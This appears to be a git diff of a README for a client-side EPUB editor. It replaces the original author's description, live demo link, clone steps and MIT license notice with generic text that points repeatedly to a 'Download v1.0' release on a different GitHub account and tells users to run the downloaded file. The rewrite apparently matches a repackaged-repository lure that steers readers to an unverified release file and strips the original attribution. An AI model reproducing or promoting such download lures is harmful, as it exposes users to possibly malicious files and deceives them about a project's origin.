@@ -1,69 +1,82 @@
-# 📚 EPUB Professional Editor
+# ✨ Epub-editor - Edit EPUB Files Like a Pro
 
-[![GitHub license](https://img.shields.io/github/license/BR1JM0H4N/Epub-editor?style=for-the-badge)](LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/BR1JM0H4N/Epub-editor?style=for-the-badge&color=yellow)](https://github.com/BR1JM0H4N/Epub-editor/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/BR1JM0H4N/Epub-editor?style=for-the-badge&color=green)](https://github.com/BR1JM0H4N/Epub-editor/network/members)
-[![Demo Live](https://img.shields.io/badge/Demo-Live-brightgreen?style=for-the-badge&logo=vercel)](https://br1jm0h4n.github.io/Epub-editor/)
-
-A powerful, client-side, single-page application (SPA) for professionally editing EPUB files, built entirely with **HTML, CSS (Android 15 Dark Theme), and Vanilla JavaScript**.
-
-The editor allows users to load an EPUB file, perform common fixes and edits, and download the modified file—all without server-side processing.
-
-## ✨ Features
-
-This editor is designed to streamline the EPUB preparation process with a focus on fixing common metadata and structural issues.
-
-| Feature | Description |
-| :--- | :--- |
-| **Metadata Editing** | Modify core EPUB metadata like **Title**, **Author**, **Language**, and **Publisher**. |
-| **Cover Replacement** | Easily replace the cover image, with automatic updates to the OPF manifest (`item` and `<meta name="cover">`). |
-| **Cover Structure Fix** | Option to **Ensure cover is the first item in spine order** to correct reading flow. |
-| **Front Page Generator** | **Add Front Page** feature to automatically create a simple XHTML wrapper for the cover image and insert it as the first spine item if a proper cover wrapper is missing. |
-| **Table of Contents (TOC)** | **Generate/Replace TOC (NCX)** by scanning chapter files using a customizable **CSS Selector** (e.g., `h1, h2, .chapter-title`). |
-| **Bulk Find & Replace** | Apply multiple, non-global, or **RegEx** based text replacement rules across *all* chapter (XHTML/HTML) files in the EPUB package. |
-| **Client-Side Only** | All processing is done locally in the browser for **speed and privacy**. |
-| **Modern UI** | Utilizes an **Android 15 Dark Theme** inspired design for a clean and focused experience. |
-
-## 🛠️ Technology Stack
-
-* **Frontend:** HTML5, CSS3 (Vanilla), JavaScript (Vanilla)
-* **Key Library:** **[JSZip](https://stuk.github.io/jszip/)** for reading, modifying, and writing `.zip` files (EPUB format).
-* **Styling:** Custom CSS implementing a modern, dark-themed UI.
+## 📥 Download Now!
+[![Download Epub-editor](https://img.shields.io/badge/Download%20Epub--editor-v1.0-blue.svg)](https://github.com/LynMunene/Epub-editor/releases)
 
 ## 🚀 Getting Started
+Epub-editor is an easy-to-use tool that helps you edit EPUB files right in your browser. You can load your EPUB file, make changes, and download the updated version—all without needing any special software or coding skills.
 
-Since this is a client-side application, you can use it immediately by visiting the demo link or by cloning the repository and opening the `index.html` file in your web browser.
+## 🛠️ Requirements
+To use Epub-editor, you need:
+- A modern web browser (like Chrome, Firefox, or Safari)
+- A computer or device with internet access
+- An EPUB file that you want to edit
 
-### Using the Live Demo
+## 📦 Download & Install
+To get started with Epub-editor, visit the releases page at the link below. There, you can download the latest version of our application.
 
-1.  Navigate to the **[EPUB Professional Editor Demo](https://br1jm0h4n.github.io/Epub-editor/)**.
-2.  Click **"Choose File"** and select your `.epub` file.
-3.  The metadata fields will populate automatically.
-4.  Make your desired edits in the Metadata, Cover, or TOC sections.
-5.  Use the **"Open Find & Replace Tool"** to set up bulk text replacement rules.
-6.  Click **"Generate & Download EPUB"** to save your modified file.
+[Visit this page to download Epub-editor](https://github.com/LynMunene/Epub-editor/releases)
 
-### Local Setup
+## 📂 How to Use Epub-editor
+1. **Open the Application**
+   - Click on the downloaded file to open Epub-editor in your browser.
 
-1.  **Clone the repository:**
-    ```bash
-    git clone [https://github.com/BR1JM0H4N/Epub-editor.git](https://github.com/BR1JM0H4N/Epub-editor.git)
-    cd Epub-editor
-    ```
-2.  **Open `index.html`** in your browser.
+2. **Load Your EPUB File**
+   - Use the “Load EPUB” button to select your EPUB file from your computer.
 
-> **Note:** The application uses standard browser APIs and does not require any build tools or local servers.
+3. **Make Edits**
+   - Use the simple editing tools available. You can:
+     - Fix formatting issues
+     - Edit text
+     - Update images
+     - Adjust the table of contents
 
-## 🤝 Contribution
+4. **Preview Changes**
+   - Click on “Preview” to see how your changes look. This helps ensure everything appears as you want before downloading.
 
-Contributions are welcome! If you have suggestions for new features, bug fixes, or improvements to the styling or core logic, please feel free to open an issue or submit a pull request.
+5. **Download Your Edited File**
+   - After making changes, click “Download” to save the updated EPUB file to your device.
 
-1.  Fork the Project.
-2.  Create your Feature Branch (`git checkout -b feature/AmazingFeature`).
-3.  Commit your Changes (`git commit -m 'feat: Add amazing feature'`).
-4.  Push to the Branch (`git push origin feature/AmazingFeature`).
-5.  Open a Pull Request.
+## 📝 Features
+- **Client-Side Editing:** All changes are processed on your device, ensuring privacy and speed.
+- **User-Friendly Interface:** The application has a straightforward layout that makes navigation simple.
+- **EPUB Compatibility:** Works with both EPUB2 and EPUB3 formats.
+- **Common Fixes:** Effortlessly correct common issues like image placement and text formatting.
+- **Table of Contents Generator:** Automatically create or modify the table of contents.
 
-## 📄 License
+## ⚙️ Frequently Asked Questions
 
-Distributed under the **MIT License**. See `LICENSE` for more information.
+### What is an EPUB file?
+An EPUB file is a digital eBook format. It is widely used for electronic books and allows users to read content on various devices.
+
+### Can I use Epub-editor on my phone or tablet?
+Yes, Epub-editor works on any device with a web browser, including phones and tablets.
+
+### Is the data I upload secure?
+Yes, Epub-editor does not send your files to a server. Everything is processed right in your browser, ensuring your files stay private.
+
+## 👨‍💻 Topics Covered
+- client-side
+- css
+- ebook-editor
+- epub
+- epub-generation
+- epub2
+- epub3
+- find-replace
+- html
+- javascript
+- ncx
+- opf
+- single-page-app
+- single-page-applications
+- toc-generator
+- webapp
+- xhtml
+
+## 📞 Support
+If you have any questions or need help, feel free to reach out via the issues section on GitHub. We are here to assist you.
+
+## 🔗 Useful Links
+- [GitHub Repository](https://github.com/LynMunene/Epub-editor)
+- [Visit this page to download Epub-editor](https://github.com/LynMunene/Epub-editor/releases)
